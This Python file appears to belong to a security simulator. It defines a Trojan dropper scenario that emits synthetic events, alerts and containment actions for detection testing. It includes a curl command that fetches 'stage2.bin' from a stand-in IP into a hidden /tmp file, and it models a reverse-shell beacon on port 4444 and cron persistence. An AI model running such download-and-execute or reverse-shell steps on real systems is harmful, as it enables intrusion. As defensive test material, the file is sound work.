"""
simulator.scenarios.trojan — Trojan dropper and C2 reverse shell scenario
========================================================================
Simulates malicious ingress download, execution from temporary folders,
process masquerading, outbound command & control beaconing, and persistence.
"""

from __future__ import annotations

from klcds.core.models import ActionType, Severity, SyscallType
from simulator.models import (
    KillChainPhase,
    ScenarioCategory,
    SimulationScenarioMetadata,
    SimulationStep,
)
from simulator.scenarios.base import BaseScenario


class TrojanScenario(BaseScenario):
    """Simulates a multi-phase Trojan Dropper with C2 Beaconing and Cron Persistence."""

    @property
    def metadata(self) -> SimulationScenarioMetadata:
        return SimulationScenarioMetadata(
            id="trojan",
            name="Trojan Dropper & C2 Reverse Shell",
            category=ScenarioCategory.MALWARE,
            description="Simulates adversary staging a malicious payload via curl, executing out of /tmp, beaconing to an external C2 IP:Port, installing persistence, and triggering automated quarantine and IP blocking.",
            mitre_tactics=["Initial Access", "Execution", "Persistence", "Command and Control"],
            mitre_techniques=[
                "T1204.002 Malicious File Execution",
                "T1071.001 Web Protocols",
                "T1053.003 Cron",
                "T1036.004 Masquerade Task or Service",
            ],
            severity=Severity.HIGH,
            default_delay_ms=350,
        )

    def build_steps(self) -> list[SimulationStep]:
        curl_pid = 7710
        payload_pid = 7715
        uid = 1000

        # Step 1: Delivery / Dropper Download
        e1 = self.create_event(
            syscall=SyscallType.EXECVE,
            pid=curl_pid,
            comm="curl",
            uid=uid,
            cmdline="curl -sSL http://198.51.100.23:8080/stage2.bin -o /tmp/.kworker_d",
        )
        e2 = self.create_event(
            syscall=SyscallType.CONNECT,
            pid=curl_pid,
            comm="curl",
            uid=uid,
            dst_ip="198.51.100.23",
            dst_port=8080,
            protocol="TCP",
        )
        step1 = SimulationStep(
            step_number=1,
            phase=KillChainPhase.DELIVERY,
            title="Staged Payload Ingress",
            description="Adversary retrieves hidden dropper binary '.kworker_d' via HTTP from known suspicious external host.",
            events=[e1, e2],
            alerts=[],
            actions=[],
            posture_impact=-10,
            delay_ms=300,
        )

        # Step 2: Execution from /tmp & Masquerading
        e3 = self.create_event(
            syscall=SyscallType.EXECVE,
            pid=payload_pid,
            comm=".kworker_d",
            uid=uid,
            exe_path="/tmp/.kworker_d",
            cmdline="/tmp/.kworker_d --daemon",
        )
        a1 = self.create_alert(
            rule_name="exec_from_untrusted_dir",
            title="⚠️ Execution from Untrusted Directory (/tmp)",
            description="Executable binary launched directly from /tmp/.kworker_d mimicking kernel worker thread name.",
            severity=Severity.HIGH,
            risk_score=78,
            primary_event=e3,
            recommended_action=ActionType.QUARANTINE_FILE,
        )
        step2 = SimulationStep(
            step_number=2,
            phase=KillChainPhase.EXPLOITATION,
            title="Untrusted /tmp Binary Execution",
            description="Trojan executes masqueraded process from world-writable temporary directory.",
            events=[e3],
            alerts=[a1],
            actions=[
                self.create_action(
                    ActionType.COLLECT_EVIDENCE,
                    "process",
                    str(payload_pid),
                    "Captured memory maps and file hash of /tmp/.kworker_d",
                    alert_id=a1.alert_id,
                )
            ],
            posture_impact=-20,
            delay_ms=350,
        )

        # Step 3: Outbound C2 Reverse Shell Beaconing
        e4 = self.create_event(
            syscall=SyscallType.CONNECT,
            pid=payload_pid,
            comm=".kworker_d",
            uid=uid,
            dst_ip="198.51.100.23",
            dst_port=4444,
            protocol="TCP",
        )
        a2 = self.create_alert(
            rule_name="suspicious_outbound_c2",
            title="🚨 Outbound C2 Beaconing Detected",
            description="Process .kworker_d established interactive TCP connection to high-risk port 4444 on 198.51.100.23.",
            severity=Severity.CRITICAL,
            risk_score=92,
            primary_event=e4,
            recommended_action=ActionType.BLOCK_IP,
        )
        step3 = SimulationStep(
            step_number=3,
            phase=KillChainPhase.COMMAND_AND_CONTROL,
            title="C2 Socket Handshake",
            description="Trojan reaches out to command-and-control server on port 4444 to establish interactive reverse shell.",
            events=[e4],
            alerts=[a2],
            actions=[
                self.create_action(
                    ActionType.BLOCK_IP,
                    "ip",
                    "198.51.100.23",
                    "Added drop rule for C2 server IP in virtual firewall table",
                    alert_id=a2.alert_id,
                )
            ],
            posture_impact=-25,
            delay_ms=400,
        )

        # Step 4: Cron Persistence Attempt & Autonomous Neutralization
        e5 = self.create_event(
            syscall=SyscallType.OPENAT,
            pid=payload_pid,
            comm=".kworker_d",
            uid=uid,
            file_path="/etc/cron.d/kworker_sync",
        )
        a3 = self.create_alert(
            rule_name="cron_persistence_attempt",
            title="⏰ Unauthorized Scheduled Task / Cron Modification",
            description="Process attempted creating persistent crontab entry '/etc/cron.d/kworker_sync'.",
            severity=Severity.HIGH,
            risk_score=85,
            primary_event=e5,
            recommended_action=ActionType.DISABLE_CRON,
        )
        step4 = SimulationStep(
            step_number=4,
            phase=KillChainPhase.INSTALLATION,
            title="Persistence Hook Insertion & Containment",
            description="Trojan attempts to persist across reboots via cron. Defense engine intercepts, quarantines binary, and terminates process.",
            events=[e5],
            alerts=[a3],
            actions=[
                self.create_action(
                    ActionType.KILL_PROCESS,
                    "process",
                    str(payload_pid),
                    "Terminated trojan process PID 7715",
                    alert_id=a3.alert_id,
                ),
                self.create_action(
                    ActionType.QUARANTINE_FILE,
                    "file",
                    "/tmp/.kworker_d",
                    "Relocated malicious dropper to secure sandbox quarantine vault",
                    alert_id=a3.alert_id,
                ),
                self.create_action(
                    ActionType.DISABLE_CRON,
                    "cron_job",
                    "/etc/cron.d/kworker_sync",
                    "Purged unauthorized crontab entry",
                    alert_id=a3.alert_id,
                ),
            ],
            posture_impact=0,
            delay_ms=450,
        )

        return [step1, step2, step3, step4]
